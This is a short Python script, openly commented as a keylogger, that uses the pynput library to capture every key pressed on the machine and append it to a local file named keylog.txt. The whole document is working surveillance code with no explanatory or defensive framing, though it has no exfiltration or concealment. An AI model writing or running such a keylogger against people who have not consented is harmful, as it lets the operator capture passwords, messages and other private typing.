from pynput.keyboard import Listener # type: ignore

def log_keystroke(key):
    with open("keylog.txt", "a") as file:
        file.write(f"{key}\n")
#Start the keylogger
with Listener(on_press=log_keystroke) as listener:
    listener.join()